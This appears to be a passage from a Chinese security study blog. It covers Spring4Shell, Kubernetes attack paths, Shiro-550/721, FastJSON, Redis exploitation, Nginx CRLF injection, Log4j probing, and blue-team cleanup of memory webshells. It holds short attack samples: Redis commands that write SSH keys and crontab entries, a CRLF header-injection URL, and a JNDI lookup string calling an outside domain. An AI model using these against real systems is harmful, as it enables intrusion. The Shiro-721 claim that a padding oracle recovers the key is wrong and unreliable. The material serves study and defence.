<li><strong>加载恶意类</strong>：一旦 <code>ClassLoader</code> 的 URL 被修改，攻击者就可以通过其他请求，让应用程序去加载一个远程的恶意 JAR 包（其中包含可以执行命令的代码）</li>
<li><strong>远程代码执行（RCE）</strong>：当恶意 JAR 包中的类被加载到 JVM 中时，其中的恶意代码（通常是静态代码块）会被自动执行，从而实现 RCE。</li>
</ol>
<p><strong>2. Spring4Shell 利用</strong></p>
<p>这个漏洞的利用需要满足几个特定条件：</p>
<ul>
<li><p><strong>依赖</strong>：应用程序必须依赖于 Spring Framework 的 <code>5.2.x</code> 到 <code>5.3.x</code> 版本</p>
</li>
<li><p><strong>环境</strong>：</p>
<ul>
<li><strong>JDK 9+</strong>：漏洞利用的原理依赖于 JDK 9+ 引入的 <code>class.module</code> 机制</li>
<li><strong>Tomcat Servlet 容器</strong>：攻击利用依赖于 Tomcat Servlet 容器，因为它暴露了可被利用的 <code>ClassLoader</code></li>
</ul>
</li>
<li><p><strong>控制器（Controller）</strong>：应用程序中必须有一个 Controller，其方法参数使用了<strong>简单的 POJO</strong>（Plain Old Java Object）进行数据绑定。例如：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping(&quot;/bind&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">bind</span><span class="params">(<span class="meta">@ModelAttribute</span> User user)</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>3. Spring4Shell 检测</strong></p>
<p>Spring4Shell 的检测方法可以分为以下几种：</p>
<ul>
<li><strong>版本检测</strong>：最直接的方法是检查应用程序所使用的 Spring Framework 版本和 JDK 版本。如果版本在受影响的范围内（如 Spring 5.2.x - 5.3.x + JDK 9+），则存在风险</li>
<li><strong>流量检测</strong>：Web 应用防火墙（WAF）可以检测 HTTP 请求中是否包含与漏洞相关的特征字符串，例如 <code>class.module.classLoader</code>。这是最有效的网络层面检测方法</li>
<li><strong>主动扫描</strong>：使用自动化漏洞扫描器（如 <strong>Nessus</strong>、<strong>OpenVAS</strong>）对目标进行扫描。这些扫描器通常集成了对 Spring4Shell 的检测模块</li>
<li><strong>代码审计</strong>：通过静态应用安全测试（SAST）工具对源代码进行审计，检查是否使用了存在漏洞的 Spring 版本和数据绑定模式</li>
</ul>
<hr>
<h3 id="Kubernetes-攻击思路"><a href="#Kubernetes-攻击思路" class="headerlink" title="Kubernetes 攻击思路"></a>Kubernetes 攻击思路</h3><p><strong>1. 从外部服务入手</strong></p>
<p>这是最常见的攻击起点，攻击者通常会寻找暴露在公网上的 K8s 组件或应用。</p>
<p><strong>a. 攻击 Web 应用</strong></p>
<ul>
<li><strong>漏洞利用</strong>：如果 K8s 集群中运行着 Web 应用，攻击者会首先对这些应用进行漏洞扫描。常见的漏洞包括 <strong>SQL 注入</strong>、<strong>文件上传</strong>、**RCE（远程代码执行）**等</li>
<li><strong>反向 Shell</strong>：一旦成功利用 RCE，攻击者可以在 Pod 内部获取一个反向 Shell。这是进入集群内部的第一步</li>
<li><strong>容器逃逸</strong>：仅仅获得 Pod 的 Shell 还不够。攻击者会尝试进行<strong>容器逃逸</strong>，利用 Pod 配置不当或内核漏洞，从容器内部获取宿主机（Node）的权限。</li>
</ul>
<p><strong>b. 攻击暴露的 K8s 服务</strong></p>
<ul>
<li><strong>Kubelet API</strong>：如果 Kubelet 的 API（默认端口 10250 或 10255）没有进行严格的认证，攻击者可以直接访问它。通过 Kubelet API，攻击者可以执行命令、查看 Pod 详情，甚至创建新的 Pod，从而实现对整个 Node 的控制</li>
<li><strong>Dashboard</strong>：如果 K8s Dashboard 暴露在公网，并且使用了弱密码，攻击者可以登录 Dashboard，然后利用其强大的 UI 界面直接管理集群资源</li>
</ul>
<p><strong>2. 权限提升与横向移动</strong></p>
<p>一旦攻击者进入集群内部，哪怕是获得了普通 Pod 的权限，他们也会立即开始进行权限提升和横向移动，寻找更高的权限，例如 <code>Cluster Admin</code></p>
<p><strong>a. 权限提升</strong></p>
<ul>
<li><strong>RBAC 滥用</strong>：K8s 的 **RBAC（基于角色的访问控制）**机制是权限提升的核心攻击点。攻击者会枚举当前 Pod 所拥有的 ServiceAccount 权限，寻找那些被错误配置为高权限的角色。例如，如果一个普通 Pod 的 ServiceAccount 拥有 <code>list secrets</code> 或 <code>create pods</code> 的权限，攻击者就可以利用这些权限来窃取敏感信息或创建恶意 Pod</li>
<li><strong>滥用宿主机挂载</strong>：如果 Pod 被配置为挂载了宿主机的敏感路径（如 <code>/etc</code>、<code>/var/run/docker.sock</code>），攻击者可以直接访问这些路径，甚至通过 <code>docker.sock</code> 控制宿主机的 Docker 守护进程，从而实现容器逃逸。</li>
</ul>
<p><strong>b. 横向移动</strong></p>
<ul>
<li><strong>ServiceAccount 凭证窃取</strong>：攻击者可以窃取当前 Pod 的 ServiceAccount Token，并使用这个 Token 伪装成 ServiceAccount，访问其他 Pod 或 K8s API</li>
<li><strong>扫描内网</strong>：利用已控制的 Pod 作为跳板，攻击者可以对集群内网进行扫描，寻找其他可以被攻击的服务或未授权的 API</li>
</ul>
<p><strong>3. 供应链攻击</strong></p>
<p>供应链攻击是一种更高级的攻击方式，它不直接攻击 K8s 集群本身，而是攻击 K8s 集群所依赖的组件</p>
<ul>
<li><strong>恶意镜像</strong>：攻击者可以将恶意代码注入到 Docker 或 OCI 镜像中。当开发者或 CI&#x2F;CD 流水线拉取并部署这个镜像时，恶意代码就会在集群内部运行</li>
<li><strong>第三方工具漏洞</strong>：攻击者可以利用 K8s 周边工具的漏洞，例如，攻击 CI&#x2F;CD 工具（如 Jenkins、Gitlab CI）或 Helm charts，通过这些工具将恶意 Payload 部署到集群中</li>
</ul>
<hr>
<h3 id="Shiro-550-721-区别"><a href="#Shiro-550-721-区别" class="headerlink" title="Shiro 550 721 区别"></a>Shiro 550 721 区别</h3><p><strong>Shiro-550（CVE-2016-4437）</strong></p>
<p><strong>Shiro-550</strong> 是利用了 Shiro <strong>硬编码的默认密钥</strong></p>
<ul>
<li><strong>漏洞原理</strong>：<ol>
<li>Apache Shiro 在 <code>RememberMe</code> 功能中，会将用户的身份信息进行序列化，然后使用一个<strong>硬编码的默认密钥</strong>进行 AES 加密，最后将加密后的数据作为 Cookie 发送给客户端</li>
<li>在 <strong>Shiro 1.2.4 及以前的版本</strong>中，这个密钥是固定的、公开的</li>
<li>攻击者可以利用这个已知的密钥，构造一个恶意的序列化 Payload（即 Gadget Chain，如 <code>CommonsCollections</code>）</li>
<li>攻击者用这个密钥对 Payload 进行加密，然后将加密后的数据作为 <code>RememberMe</code> Cookie 发送给服务器</li>
<li>服务器收到这个 Cookie 后，会使用<strong>相同的默认密钥</strong>对数据进行解密，然后对解密后的数据进行<strong>反序列化</strong></li>
<li>在反序列化过程中，恶意的 Gadget Chain 被触发，导致远程代码执行（RCE）</li>
</ol>
</li>
<li><strong>攻击流程</strong>：<ol>
<li><strong>获取密钥</strong>：攻击者知道 Shiro 默认的硬编码密钥</li>
<li><strong>构造 Payload</strong>：利用 <code>ysoserial</code> 等工具生成一个反序列化 Payload</li>
<li><strong>加密 Payload</strong>：用默认密钥对 Payload 进行 AES 加密</li>
<li><strong>发送 Cookie</strong>：将加密后的数据作为 <code>RememberMe</code> Cookie 发送给服务器</li>
<li><strong>触发反序列化</strong>：服务器解密并反序列化，导致 RCE</li>
</ol>
</li>
<li><strong>影响范围</strong>：Shiro &lt;&#x3D; 1.2.4 版本</li>
</ul>
<p><strong>Shiro-721（CVE-2019-12422）</strong></p>
<p><strong>Shiro-721</strong> 绕过了默认密钥的问题，它利用的是 <strong>AES-CBC 模式的漏洞</strong></p>
<ul>
<li><strong>漏洞原理</strong>：<ol>
<li>在 Shiro 1.2.5 到 1.4.1 版本中，虽然移除了硬编码密钥，但攻击者发现，当应用程序使用<strong>一个可猜测或已知的密钥</strong>时，仍然可以利用 AES-CBC 模式的<strong>填充 oracle 攻击</strong></li>
<li>AES-CBC 模式在解密时，如果数据填充（Padding）不正确，会返回一个特定的错误。攻击者可以利用这个错误来猜测加密数据中的每个字节</li>
<li>通过这种方式，攻击者可以<strong>逐字节地解密 <code>RememberMe</code> Cookie 中的数据</strong>，从而获取加密密钥</li>
<li>一旦密钥被破解，攻击者就可以像 Shiro-550 一样，构造恶意的 Payload 并进行加密，从而触发 RCE</li>
</ol>
</li>
<li><strong>攻击流程</strong>：<ol>
<li><strong>获取密钥</strong>：攻击者利用 AES-CBC 的填充 oracle 漏洞，通过发送大量畸形请求，并根据服务器的响应，逐字节地破解加密密钥</li>
<li><strong>构造 Payload</strong>：利用 <code>ysoserial</code> 生成 Payload</li>
<li><strong>加密 Payload</strong>：用刚刚破解的密钥对 Payload 进行加密</li>
<li><strong>发送 Cookie</strong>：将加密后的数据作为 <code>RememberMe</code> Cookie 发送给服务器</li>
<li><strong>触发反序列化</strong>：服务器解密并反序列化，导致 RCE</li>
</ol>
</li>
<li><strong>影响范围</strong>：Shiro 1.2.5 - 1.4.1 版本</li>
</ul>
<table>
<thead>
<tr>
<th>特性</th>
<th>Shiro-550</th>
<th>Shiro-721</th>
</tr>
</thead>
<tbody><tr>
<td>漏洞类型</td>
<td>硬编码密钥导致的反序列化</td>
<td>AES-CBC 模式的填充 oracle 漏洞</td>
</tr>
<tr>
<td>攻击目标</td>
<td>已知密钥</td>
<td>未知密钥</td>
</tr>
<tr>
<td>攻击方式</td>
<td>直接利用已知的密钥进行加密</td>
<td>通过填充 oracle 攻击来破解密钥，然后利用密钥</td>
</tr>
<tr>
<td>利用难度</td>
<td>简单，直接利用</td>
<td>复杂，需要多次请求进行破解</td>
</tr>
<tr>
<td>影响版本</td>
<td>Shiro &lt;&#x3D; 1.2.4</td>
<td>Shiro 1.2.5 - 1.4.1</td>
</tr>
</tbody></table>
<hr>
<h3 id="FastJSON-不出网利用方式"><a href="#FastJSON-不出网利用方式" class="headerlink" title="FastJSON 不出网利用方式"></a>FastJSON 不出网利用方式</h3><p><strong>1. 本地文件读写</strong></p>
<p>这是最常见的一种不出网利用方式。FastJson 的反序列化漏洞可以被利用来调用一些特定的类，这些类能够处理文件操作。</p>
<ul>
<li><strong>本地文件读取</strong>: 我们可以利用 <code>com.sun.rowset.JdbcRowSetImpl</code> 类，在 <code>dataSourceName</code> 属性中构造一个特殊的 JNDI 字符串，例如 <code>rmi://localhost:1099/Evil</code>。在无法出网的情况下，这个 RMI 请求会失败，但如果我们将利用链和本地文件操作相结合，比如通过加载一些可以处理本地文件路径的类，理论上可以实现本地文件读取。一个更直接且知名的利用方式是利用 <code>javax.imageio.ImageIO</code> 类，通过 <code>read()</code> 方法加载一个恶意的 TIFF 或 GIF 文件，如果这个文件包含了特殊的 Payload，就能触发进一步的利用</li>
<li><strong>本地文件写入</strong>: 我们可以利用一些可以写文件的类，例如通过加载一些可以处理文件路径的类，并结合一些 <strong>gadget</strong> 链来构造一个可以写入文件的 Payload。这需要我们对 FastJson 的 Gadget 链有深入的理解，并找到合适的类来完成文件写入操作</li>
</ul>
<p><strong>2. 命令执行</strong></p>
<p>如果能找到一个可以触发本地命令执行的 Gadget 链，那么即使不出网也能直接在目标服务器上执行命令</p>
<p><strong><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code></strong>: 这是 FastJson 漏洞利用中最经典的 Gadget 之一。通过控制 <code>_bytecodes</code> 字段，我们可以加载一个恶意的 Java 类。这个类在被加载和实例化时，可以在其静态代码块或者构造函数中执行本地命令，例如 <code>Runtime.getRuntime().exec(&quot;command&quot;)</code></p>
<p><strong><code>org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor</code></strong> 等其他 Gadget: 除了 <code>TemplatesImpl</code>，还有很多其他的 Gadget 链可以被利用来触发命令执行。这些 Gadget 链通常涉及到不同的库和类，但其核心思想都是通过反序列化加载一个恶意类，并在该类中执行命令</p>
<p><strong>3. 内存马注入</strong></p>
<p>这是一种更高级的无文件攻击方式</p>
<ul>
<li><strong>动态注入</strong>: 我们可以利用 FastJson 的反序列化漏洞，通过一些特殊的 Gadget 链，在内存中动态地注入一个 <strong>Webshell</strong>。这个 Webshell 不会以文件的形式存在于磁盘上，而是直接运行在内存中。攻击者可以通过访问特定的 URL 或者发送特定的请求来与这个内存马进行交互，从而实现命令执行、文件管理等操作。这种方式由于没有落地文件，可以有效规避基于文件哈希或特征的检测</li>
</ul>
<hr>
<h3 id="Windows-和-Linux-利用-REDIS-的区别"><a href="#Windows-和-Linux-利用-REDIS-的区别" class="headerlink" title="Windows 和 Linux 利用 REDIS 的区别"></a>Windows 和 Linux 利用 REDIS 的区别</h3><p><strong>1. 权限与用户</strong></p>
<ul>
<li><strong>Linux</strong>: Redis 服务通常以低权限用户（如 <code>redis</code> 或 <code>nobody</code>）运行。这意味着即使你通过 Redis 成功写入了文件，比如写入一个 SSH 公钥到 <code>~/.ssh/authorized_keys</code>，你所能控制的也只是该低权限用户。要提升权限，你还需要找到另一个本地提权漏洞，这通常需要更多的步骤</li>
<li><strong>Windows</strong>: 在 Windows 上，Redis 常常以 <code>SYSTEM</code> 或其他管理员权限运行，尤其是在一些不规范的部署中。如果能通过 Redis 成功写入文件，例如写入一个 WebShell 到网站目录或创建一个启动项，你所获得的权限可能直接就是 <code>SYSTEM</code> 级别。这使得 Windows 上的利用变得更简单粗暴，危害也更大</li>
</ul>
<p><strong>2. 利用方式</strong></p>
<ul>
<li><strong>Linux</strong>:<ul>
<li><strong>写 SSH 公钥</strong>: 这是最经典的利用方式。通过 <code>config set dir /root/.ssh/</code> 和 <code>config set dbfilename authorized_keys</code>，然后用 <code>set</code> 命令写入公钥，最后用 SSH 连接。这需要知道目标系统的用户家目录，通常是 <code>root</code> 或 <code>redis</code> 用户</li>
<li><strong>写 Crontab</strong>: 利用 Redis 写入定时任务，反弹 Shell。<code>config set dir /var/spool/cron/</code> 和 <code>config set dbfilename root</code>，然后写入反弹 Shell 的命令。这种方式可以获得稳定的 Shell，但需要 Redis 有足够的权限写入该目录</li>
<li><strong>写 WebShell</strong>: 写入 PHP、JSP 等 WebShell 到网站目录，通常需要 Web 服务器和 Redis 运行在同一台机器上，并且 Redis 有写入 Web 目录的权限</li>
</ul>
</li>
<li><strong>Windows</strong>:<ul>
<li><strong>写 WebShell</strong>: 写入 WebShell 到 <code>wwwroot</code> 或其他网站目录。这是最常见的利用方式，因为 Redis 经常与 Web 服务部署在同一台机器上</li>
<li><strong>写入启动项&#x2F;服务</strong>: 由于权限通常较高，可以直接写入 <code>.bat</code> 或 <code>.exe</code> 文件到启动目录或创建新的服务，实现权限维持和持久化</li>
<li><strong>DLL 劫持</strong>: 高权限下的一个高级利用方式，将恶意的 DLL 文件写入到某个高权限程序会加载的路径，实现代码执行</li>
</ul>
</li>
</ul>
<p><strong>3. 环境与工具链</strong></p>
<ul>
<li><strong>Linux</strong>:<ul>
<li><strong>环境依赖</strong>: Linux 环境下，渗透测试人员需要熟悉 Linux 文件系统路径、Cron 任务机制和各种 Shell 类型（Bash, Zsh）</li>
<li><strong>工具</strong>: <code>redis-cli</code> 是最直接的交互工具。远程连接时，可以利用 <code>netcat</code> 或 <code>socat</code> 等工具来处理端口转发</li>
<li><strong>持久化</strong>: Cron 任务、SSH 公钥都是很好的持久化手段</li>
</ul>
</li>
<li><strong>Windows</strong>:<ul>
<li><strong>环境依赖</strong>: 熟悉 Windows 文件系统路径（如 <code>C:\Windows\System32</code>）、服务管理（<code>services.msc</code>）和启动项（<code>startup</code> 文件夹）</li>
<li><strong>工具</strong>: <code>redis-cli</code> 同样适用。但后续的利用，如上传 WebShell，可能需要依赖更多的工具或脚本来执行</li>
<li><strong>持久化</strong>: 写入服务、注册表键值、计划任务都是常见的持久化手段</li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th>特性</th>
<th>Windows 利用</th>
<th>Linux 利用</th>
</tr>
</thead>
<tbody><tr>
<td>权限</td>
<td>通常更高，甚至可达 SYSTEM</td>
<td>通常较低，为 redis 或 nobody</td>
</tr>
<tr>
<td>利用方式</td>
<td>写入 WebShell、启动项、服务等</td>
<td>写入 SSH 公钥、Crontab、WebShell</td>
</tr>
<tr>
<td>持久化</td>
<td>写入服务、计划任务、启动项</td>
<td>写入 Crontab、SSH 公钥</td>
</tr>
<tr>
<td>成功率</td>
<td>如果权限高，成功率高，后果严重</td>
<td>需要找到合适的写入路径，可能需要提权</td>
</tr>
<tr>
<td>主要区别</td>
<td>高权限直接执行命令，易于利用</td>
<td>低权限，需要提权，利用方式更依赖环境</td>
</tr>
</tbody></table>
<hr>
<h3 id="Nginx-CRLF-注入原理"><a href="#Nginx-CRLF-注入原理" class="headerlink" title="Nginx CRLF 注入原理"></a>Nginx CRLF 注入原理</h3><p><strong>什么是 CRLF？</strong></p>
<p>CRLF 是 <strong><code>Carriage Return Line Feed</code></strong> 的缩写，中文意思是<strong>回车换行</strong></p>
<ul>
<li><code>CR</code> (回车) 对应的十六进制是 <code>0x0D</code>，URL 编码是 <code>%0d</code></li>
<li><code>LF</code> (换行) 对应的十六进制是 <code>0x0A</code>，URL 编码是 <code>%0a</code></li>
</ul>
<p>在 HTTP 协议中，CRLF 有着特殊的意义</p>
<p>HTTP 报文（包括请求头和响应头）都是由一行行文本组成的，而每一行的结束都由 <strong>CRLF</strong> 来标记</p>
<p>服务器解析 HTTP 报文时，就是通过 <code>CRLF</code> 来判断一行的结束和下一行的开始</p>
<p><strong>Nginx CRLF 注入原理</strong></p>
<p>Nginx CRLF 注入的根本原因是：<strong>Nginx 将用户输入的数据直接或间接用在了 HTTP 响应头中，并且没有对数据中的特殊字符（尤其是 <code>%0d%0a</code>）进行严格过滤</strong></p>
<p>当攻击者在 URL 中注入 <code>%0d%0a</code> 时，Nginx 在构建 HTTP 响应头时会把这两个特殊字符当成普通字符串处理，直接写入响应头</p>
<p>服务器在解析这个响应时，看到 <code>%0d%0a</code> 就会将其<strong>解析为真正的回车换行符</strong>，从而导致：</p>
<ul>
<li><strong>HTTP 响应头提前结束</strong>：服务器认为响应头已经结束了</li>
<li><strong>攻击者可以注入新的响应头</strong>：攻击者可以注入一个或多个新的响应头，例如 <code>Set-Cookie</code>、<code>Location</code> 等</li>
<li><strong>攻击者可以注入完整的 HTTP 响应体</strong>：攻击者甚至可以注入一个全新的 HTTP 响应体，实现<strong>响应拆分</strong>（HTTP Response Splitting）攻击</li>
</ul>
<p>正常情况下，如果你访问 <code>http://example.com/redirect?url=/home</code>，服务器会返回</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 302 Moved Temporarily</span><br><span class="line">Server: nginx/1.20.1</span><br><span class="line">Location: /home</span><br><span class="line">Content-Type: text/html</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>但是，如果攻击者构造一个恶意的 URL：<code>http://example.com/redirect?url=/home%0d%0aSet-Cookie:crlf=test</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 302 Moved Temporarily</span><br><span class="line">Server: nginx/1.20.1</span><br><span class="line">Location: /home</span><br><span class="line">Set-Cookie: crlf=test</span><br><span class="line">Content-Type: text/html</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>你会发现，攻击者成功地在响应中注入了一个 <strong><code>Set-Cookie</code></strong> 响应头</p>
<hr>
<h3 id="如何判断靶标是否使用-FastJSON"><a href="#如何判断靶标是否使用-FastJSON" class="headerlink" title="如何判断靶标是否使用 FastJSON"></a>如何判断靶标是否使用 FastJSON</h3><p><strong>1. 报错信息</strong></p>
<p>通过构造特殊的请求来触发应用程序的报错，并从报错信息中寻找线索</p>
<ul>
<li><p><strong>构造畸形 JSON 数据</strong>: 向目标API发送一个<strong>格式错误的JSON</strong>（例如，<code>&#123;&quot;a&quot;: 1, &quot;b&quot;: &quot;2&quot;,&#125;</code>，多一个逗号）。如果服务器返回的错误信息中包含 <code>com.alibaba.fastjson</code>、<code>fastjson.JSONException</code> 或其他与 Fastjson 相关的关键字，那么就可以确定目标使用了 Fastjson</p>
<p><img src="https://pic1.imgdb.cn/item/68cd62cac5157e1a881d5260.png"></p>
</li>
<li><p><strong>尝试特定语法</strong>: Fastjson 在处理一些特殊类型时有其独特的语法。你可以尝试发送一个包含 <code>@type</code> 字段的 JSON，例如 <code>&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.alibaba.fastjson.JSON&quot;&#125;</code>。如果服务器返回了与这个字段相关的解析错误，那么目标可能使用了 Fastjson</p>
<p><img src="https://pic1.imgdb.cn/item/68cd6303c5157e1a881d52b8.png"></p>
</li>
</ul>
<p><strong>2. 数值型数据</strong></p>
<p>FastJSON 会把 01 解析成 1</p>
<p><img src="https://pic1.imgdb.cn/item/68cd635fc5157e1a881d535e.png"></p>
<p>FastJSON 1.2.70 会把 NaN 解析成 0</p>
<p><img src="https://pic1.imgdb.cn/item/68cd659ac5157e1a881d58ab.png"></p>
<p>Fastjson 1.2.37 会抛出异常</p>
<p><img src="https://pic1.imgdb.cn/item/68cd65f1c5157e1a881d59b9.png"></p>
<p><strong>3. 注释符</strong></p>
<p>FastJSON 支持注释符</p>
<p><img src="https://pic1.imgdb.cn/item/68cd6618c5157e1a881d5a50.png"></p>
<p><strong>4. 单引号</strong></p>
<p>FastJSON 的 <code>Feature.AllowSingleQuote</code> 是默认开启的，支持使用单引号包裹字段名</p>
<p><img src="https://pic1.imgdb.cn/item/68cd66afc5157e1a881d5d24.png"></p>
<p><strong>5. 缺失值</strong></p>
<p>FastJSON 正常解析，会把缺失的值忽略掉</p>
<p><img src="https://pic1.imgdb.cn/item/68cd66e0c5157e1a881d5db4.png"></p>
<p><strong>6. 大小写</strong></p>
<p>FastJSON 在反序列化的时候，是对大小写不敏感的</p>
<p><img src="https://pic1.imgdb.cn/item/68cd6725c5157e1a881d5e7a.png"></p>
<p><strong>7. 特殊符号</strong></p>
<p>FastJSON 1.2.36 版本及后续版本支持同时使用 <code>_</code> 和 <code>-</code> 对字段名进行处理</p>
<p><img src="https://pic1.imgdb.cn/item/68cd680ec5157e1a881d61d4.png"></p>
<hr>
<h3 id="如何判断靶标是否使用-Log4j"><a href="#如何判断靶标是否使用-Log4j" class="headerlink" title="如何判断靶标是否使用 Log4j"></a>如何判断靶标是否使用 Log4j</h3><p>通过构造特殊请求，观察目标系统的反应</p>
<ol>
<li><p><strong>利用 JNDI 注入</strong>: 这是最经典的 Log4j 漏洞探测方法。在 HTTP 请求的各个位置（如 <code>User-Agent</code>、<code>X-Api-Key</code>、<code>Cookie</code>、POST 请求体等）注入一个 JNDI 字符串，并指向一个你可以控制的域名。</p>
<ul>
<li><p>构造一个 DNS 请求：例如 <code>$&#123;jndi:ldap://your-domain.com/a&#125;</code></p>
</li>
<li><p>原理: 如果目标使用了 Log4j 且存在漏洞，它会解析这个字符串，并向你的域名发送一个 DNS 查询请求</p>
</li>
<li><p>判断: 你只需要在你的服务器上监听 DNS 请求。如果收到了来自目标 IP 的 DNS 请求，那就说明它解析了你的 Payload，很可能使用了 Log4j</p>
</li>
</ul>
</li>
<li><p><strong>报错信息分析</strong>: 构造一个会触发应用错误的请求，并观察返回的错误信息</p>
<ul>
<li><p>例如: 在请求参数中输入一些特殊字符，让程序抛出异常。如果错误堆栈中出现了 <code>org.apache.logging.log4j</code> 或其他相关的类名，则可以确认</p>
</li>
<li><p>这种方法需要目标系统配置为显示详细的错误信息，这在生产环境中并不常见，但在开发或测试环境中可能有效</p>
</li>
</ul>
</li>
</ol>
<h1 id="8-蓝队防守系列"><a href="#8-蓝队防守系列" class="headerlink" title="8- 蓝队防守系列"></a>8- 蓝队防守系列</h1><h3 id="内存马查杀思路"><a href="#内存马查杀思路" class="headerlink" title="内存马查杀思路"></a>内存马查杀思路</h3><p>在查杀之前，首先要了解内存马的常见类型。它们通常可以分为以下几类：</p>
<ul>
<li><strong>Filter&#x2F;Servlet 类型：</strong> 攻击者通过向 Web 容器（如 Tomcat）动态注册恶意 Filter 或 Servlet，来实现持久化控制</li>
<li><strong>Listener 类型：</strong> 攻击者通过注册恶意 Listener，在特定事件发生时触发恶意代码</li>
<li><strong>Java Agent&#x2F;Instrumentation 类型：</strong> 这种技术可以在不修改字节码的情况下，在 JVM 运行时对已加载的类进行修改，实现更隐蔽的注入</li>
</ul>
<p><strong>第一步：何时打进来的？</strong></p>
<ol>
<li><p>**流量分析：**监控 Web 服务器的流量。如果发现异常的 HTTP 请求，比如带有很多不寻常参数的请求，或者与正常业务逻辑不符的 URL 访问，都可能是内存马的征兆</p>
<p>1.1 <code>http://your-app.com/shell.do?pwd=a1b2c3d4&amp;cmd=whoami</code></p>
</li>
<li><p><strong>日志分析：</strong> 检查 Web 服务器（如 Tomcat）的访问日志。如果发现一些不寻常的请求，并且这些请求没有在正常的 Servlet 或 Controller 中找到对应的处理逻辑，那么很可能是内存马在处理这些请求</p>
<p>2.1 检查 Tomcat 的 <code>access_log</code>，发现有对 <code>/static/12345.css</code> 的请求，但该文件并不存在于硬盘上。如果这个请求的返回状态码是 200，而不是预期的 404，那么很可能是一个 Filter 内存马在默默处理这个请求</p>
</li>
<li><p>**CPU&#x2F;内存异常：**内存马通常会消耗额外的系统资源。如果 Web 服务器的 CPU 或内存使用率突然升高，并且没有对应的业务高峰，需要警惕</p>
<p>3.1 在没有业务高峰的情况下，CPU 占用率持续飙升到 90% 以上，同时内存使用量也快速增长</p>
</li>
<li><p>**工具扫描：**使用专业的 Java 安全工具或 Agent 进行扫描</p>
</li>
</ol>
<p><strong>第二步：内存马具体位置？</strong></p>
<ol>
<li><p>使用内存分析工具：jmap、Artha、BTrace&#x2F;jfr</p>
<p>1.1 **jmap：**使用 <code>jmap</code> 可以生成 Java 堆内存的 dump 文件。通过分析这个文件，可以找到异常的对象实例</p>
<p>1.2 **Arthas：**Arthas是一款非常强大的 Java 诊断工具。它可以在不重启应用的情况下，定位和排查问题</p>
<ul>
<li>使用 <strong><code>sc</code></strong>（<code>search class</code>）命令查找可疑的类。例如，<code>sc -d org.apache.catalina.core.ApplicationContext</code> 可以查看 Web 容器的上下文</li>
<li>使用 <strong><code>jad</code></strong>（<code>decompile</code>）命令反编译可疑的类，查看其代码逻辑</li>
<li>使用 <strong><code>trace</code></strong> 和 <strong><code>watch</code></strong> 命令跟踪特定方法的调用，观察参数和返回值，判断是否有异常行为</li>
</ul>
<p>1.3 <strong>BTrace&#x2F;jfr：</strong> 这些工具可以用于动态地跟踪 JVM 运行时行为，帮助你定位恶意代码的注入点</p>
</li>
<li><p>**检查 Web 容器注册表：**对于 Tomcat，可以检查其内部注册的 Filter、Servlet、Listener 等</p>
<p>2.1 在 Tomcat 8 及更高版本中，可以通过 <code>org.apache.catalina.core.ApplicationContext</code> 类的 <code>filterConfigs</code>、<code>servletConfigs</code> 等字段，或者直接通过反射获取这些注册信息</p>
</li>
<li><p>**排查自定义 ClassLoader：**恶意代码可能会使用自定义的 <code>ClassLoader</code> 来加载恶意类，以绕过常规的类加载器</p>
<p>3.1 可以通过 <code>jmap -clstats</code> 或者 Arthas 的 <code>classloader</code> 命令，查看 JVM 中存在的 <code>ClassLoader</code> 实例。如果发现一些不寻常的 <code>ClassLoader</code>，需要重点关注</p>
</li>
</ol>
<p><strong>第三步：西内！！！</strong></p>
<ol>
<li><p>**内存中直接删除：**使用 Arthas 等工具，可以通过命令直接移除恶意对象。例如，可以调用 <code>ApplicationContext</code> 的 <code>removeFilterDef</code>、<code>removeServletDef</code> 等方法，或者通过反射将恶意实例从注册表中移除</p>
<p>1.1 <code>ognl &#39;#context=@org.apache.catalina.core.ApplicationContext@ApplicationContext, #context.removeFilterDef(&quot;filter_12345&quot;), #context.removeFilterMap(&quot;filter_12345&quot;)&#39;</code></p>
</li>
<li><p>**重启 Web 应用：**这是最直接也最彻底的清除方法。因为内存马是驻留在内存中的，重启应用会清空内存，所有恶意代码都会被清除</p>
<p>2.2 找到 Java 进程 ID，使用 <code>kill -9 &lt;pid&gt;</code> 或者通过 Tomcat 的 <code>shutdown.sh</code> 脚本关闭，然后再通过 <code>startup.sh</code> 启动</p>
<hr>
<h3 id="拿到攻击者-IP-怎么溯源"><a href="#拿到攻击者-IP-怎么溯源" class="headerlink" title="拿到攻击者 IP 怎么溯源"></a>拿到攻击者 IP 怎么溯源</h3></li>
</ol>
<p><strong>第一步：信息收集</strong></p>
<p>这一步是溯源的基础，我们通过已有的安全日志和数据包，快速获取攻击者的初步信息</p>
<ul>
<li><strong>获取攻击者 IP 和攻击方式</strong>：这是溯源的起点。你需要从 Web 服务器日志、WAF、IPS、蜜罐等安全设备中，提取出攻击者的源 IP 地址，并分析其攻击方式（如 SQL 注入、命令执行、WebShell 上传等）</li>
<li><strong>威胁情报平台分析</strong>：利用威胁情报平台（如微步、安恒威胁情报中心、VirusTotal）对攻击者 IP 进行快速检测<ul>
<li><strong>判断 IP 性质</strong>：它是一个常规的云服务器、代理IP，还是已知的恶意 IP？</li>
<li><strong>获取基础信息</strong>：查看IP地址的归属地（国家、地区）、所属的 ISP（互联网服务提供商）</li>
<li><strong>端口和服务探测</strong>：利用 Shodan 等工具，探测该 IP 地址开放了哪些端口，运行着哪些服务，这有助于了解该 IP 是否被用作 C&amp;C 服务器或其他恶意用途</li>
